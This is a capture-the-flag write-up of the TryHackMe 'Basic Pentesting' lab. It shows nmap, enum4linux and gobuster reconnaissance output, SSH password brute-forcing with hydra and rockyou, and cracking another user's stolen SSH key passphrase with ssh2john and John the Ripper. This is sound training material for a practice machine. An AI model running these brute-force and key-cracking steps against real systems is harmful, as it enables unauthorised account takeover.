# Basic Pentesting
> 4lch3my | March 03, 2023
-------------------
#### This is a machine that allows you to practise web app hacking and privilege escalation
#### [Room Link](https://tryhackme.com/room/basicpentestingjt)

## Tasks
##### 1. Deploy the machine and connect to our network
  Deploy the machine with the Start Machine button, also either deploy your Attack Box [link it here] OR Connect to OpenVPN and deploy your personal KALI machine.
##### 2. Find the services exposed by the machine
  This is where the basics of recon come into play. To start, I use [nmap] which is default option on the personal Kali install I have. We start with a basic command
  ` nmap -sC -sV -A -v MACHINE_IP `
  The -sC flag runs scripts against open ports as well to determine if there are external/common vulnerabilities that we can use outright. The -sV probes all open ports it finds to determine if we can get the service/version information. -v outputs in verbose mode, so we can follow along with the commands and enumeration.
  In our NMAP results we get:
  ```
  # Starting Nmap 7.60 ( https://nmap.org ) at 2023-03-06 00:23 GMT
NSE: Loaded 146 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 00:23
Completed NSE at 00:23, 0.00s elapsed
Initiating NSE at 00:23
Completed NSE at 00:23, 0.00s elapsed
Initiating ARP Ping Scan at 00:23
Scanning 10.10.157.115 [1 port]
Completed ARP Ping Scan at 00:23, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:23
Completed Parallel DNS resolution of 1 host. at 00:23, 0.00s elapsed
Initiating SYN Stealth Scan at 00:23
Scanning ip-10-10-157-115.eu-west-1.compute.internal (10.10.157.115) [1000 ports]
Discovered open port 139/tcp on 10.10.157.115
Discovered open port 8080/tcp on 10.10.157.115
Discovered open port 22/tcp on 10.10.157.115
Discovered open port 445/tcp on 10.10.157.115
Discovered open port 80/tcp on 10.10.157.115
Discovered open port 8009/tcp on 10.10.157.115
Completed SYN Stealth Scan at 00:23, 1.50s elapsed (1000 total ports)
Initiating Service scan at 00:23
Scanning 6 services on ip-10-10-157-115.eu-west-1.compute.internal (10.10.157.115)
Completed Service scan at 00:23, 11.03s elapsed (6 services on 1 host)
Initiating OS detection (try #1) against ip-10-10-157-115.eu-west-1.compute.internal (10.10.157.115)
adjust_timeouts2: packet supposedly had rtt of -175570 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -175570 microseconds.  Ignoring time.
NSE: Script scanning 10.10.157.115.
Initiating NSE at 00:23
Completed NSE at 00:23, 0.61s elapsed
Initiating NSE at 00:23
Completed NSE at 00:23, 0.00s elapsed
Nmap scan report for ip-10-10-157-115.eu-west-1.compute.internal (10.10.157.115)
Host is up (0.0022s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (EdDSA)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.7
MAC Address: 02:E1:88:82:EE:71 (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Uptime guess: 0.059 days (since Sun Mar  5 22:59:21 2023)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   BASIC2<00>           Flags: <unique><active>
|   BASIC2<03>           Flags: <unique><active>
|   BASIC2<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2023-03-05T19:23:36-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-03-06 00:23:35
|_  start_date: 1600-12-31 23:58:45

TRACEROUTE
HOP RTT     ADDRESS
1   2.18 ms ip-10-10-157-115.eu-west-1.compute.internal (10.10.157.115)

NSE: Script Post-scanning.
Initiating NSE at 00:23
Completed NSE at 00:23, 0.00s elapsed
Initiating NSE at 00:23
Completed NSE at 00:23, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds
           Raw packets sent: 1036 (47.984KB) | Rcvd: 1028 (43.544KB)
```

We see that there is a website located at port 80. Before we check this out, we always want more automated scan running in the background so lets throw [enum4linux] at the box to see what we get while we manually explore the web server.
Running enum4linux:

` enum4linux -a MACHINE_IP`

  <br> Until that is running, lets look at the webserver.

  With a basic "Ongoing Maintenance" page we open the source to find
  ``` HTML
  <html>

  <h1>Undergoing maintenance</h1>

  <h4>Please check back later</h4>
  <!-- Check our dev note section if you need to know what to work on. -->

  </html>
  ```
 Nothing to see here it seems. Lets move on.
##### 3. What is the name of the hidden directory on the web server?
 Gobuster is my go-to enum tool, the setup instructions for it can be found [here].
  `gobuster dir -u http://MACHINE_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
  This might take a while to run, but let's see the outpout below:
  ```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.157.115/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/03/06 00:38:33 Starting gobuster
===============================================================
/development (Status: 301)
/server-status (Status: 403)
===============================================================
2023/03/06 00:38:57 Finished
===============================================================
  ```
When we go to that site we get these files.

![development_directory][6]

Clicking dev.txt, we get:
```

2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```
This corresponds to what we saw in the nmap scan with the Apache version and SMB being available.
In j.txt:
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```
This might be a hint to the usernames what we will be looking for later.

##### 4. User brute-forcing to find the username & password
###### 5. What is the username?
###### 6. What is the password?
Lets give a look at the enum4Linux script to see what we have available.  Scrolling down to enumerating users we see this:
```
 ======================================================================== 
|    Users on 10.10.157.115 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2853212168-2008227510-3551253869
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)

```
This gives us a user - jan. We can use the tool hydra to try bruteforcing this user with the famous rockyou worldlist on the SSH protocol what we found earlier:
`hydra -l jan -P /usr/share/wordlists/rockyou.txt MACHINE_IP ssh
`
After running for a bit we get the output
```
Hydra v9.0 (c) 2020 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-03 15:52:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 9999 login tries (l:1/p:9999), ~625 tries per task
[DATA] attacking ssh://10.10.68.148:22/
[STATUS] 178.00 tries/min, 178 tries in 00:01h, 9823 to do in 00:56h, 16 active
[STATUS] 119.33 tries/min, 358 tries in 00:03h, 9643 to do in 01:21h, 16 active
[STATUS] 116.86 tries/min, 818 tries in 00:07h, 9183 to do in 01:19h, 16 active
[STATUS] 113.20 tries/min, 1698 tries in 00:15h, 8303 to do in 01:14h, 16 active
[22][ssh] host: 10.10.68.148   login: jan   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
```
And there we go, we have succeefully found jan's password.
##### 7. What service do you use to access the server
Perfect! We now have a login for ssh. Let's do it!
`ssh jan@MACHINE_IP`
When prompted we add the password what we found above!

##### 8. Enumerate the machine to find any vectors for privilege escalation
We can look across the server for files, folders and users to enumerate to. `ls -la` does not show us anything interesting, but `ls ..` does revial the other user kay. After switching to that users directory, we can `ls -la` the user to find:
```
[+] Files inside others home (limit 20)
/home/kay/.profile                                                                                 
/home/kay/.viminfo
/home/kay/.bashrc
/home/kay/.bash_history
/home/kay/.lesshst
/home/kay/.ssh/authorized_keys
/home/kay/.ssh/id_rsa
/home/kay/.ssh/id_rsa.pub
/home/kay/.bash_logout
/home/kay/.sudo_as_admin_successful
/home/kay/pass.bak
```
So we see id_rsa & id_rsa.pub in kay's folder which corresponds keys for ssh. And with the pass.bak we can guess that it has kay's password in it.

##### 9. 	What is the name of the other user you found?
We where able to find this user a little bit above, also hinted in the original web server on port 80.

Unfortunately when we try to ssh using the key file we see the key requires a password.
```
jan@basic2:/home/kay/.ssh$ ssh -i id_rsa kay@127.0.0.1
Enter passphrase for key 'id_rsa':
```
But luckily we can cat out this file and crack the key with another famous tool: JohnTheRipper

Using `ssh2john.py id_rsa > john_id_rsa.hash` we get a john-crackable file that we can start here. `john --wordlist=/usr/share/wordlists/rockyou.txt john_id_rsa.hash`

But it quickly finds the password for the key file
```
[REDACTED]         (kay_id_rsa)
```
 With this freshly cracked password, let's log in to the users and get the pass.bak file!

##### 10. If you have found another user, what can you do with this information?
Since there isnt a flag for this we can only think about the possible information we could do. Using an additional user we could see if it was part of any groups in `/etc/groups` or have programs that you can sudo `Check with sudo -l` . It truly depends on what is configured on a machine, but running something like LinPeas.sh will give you a good starting point!

##### 11. What is the final password you obtain?
 That contains our final flags!


#### Thank you for checking out my write-up about the THM room: Basic Pentesting! If you are interested in other write-ups of mine or interetsed in some of my codeing work, please feel free to look around my GitHub page! Happy hacking! - 4lch3my



[1]: https://tryhackme.com/room/basicpentesting
[2]: https://tryhackme.com/access
[3]: https://nmap.org/
[4]: https://ippsec.rocks/# 
[5]: https://hackertarget.com/gobuster-tutorial/
[6]: https://raw.githubusercontent.com/gwagstaff/CTF-Write-Ups/master/TryHackMe/Basic_Webapp/resources/webapp_80_files.png
[7]: https://github.com/danielmiessler/SecLists
[8]: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
[9]: https://github.com/magnumripper/JohnTheRipper
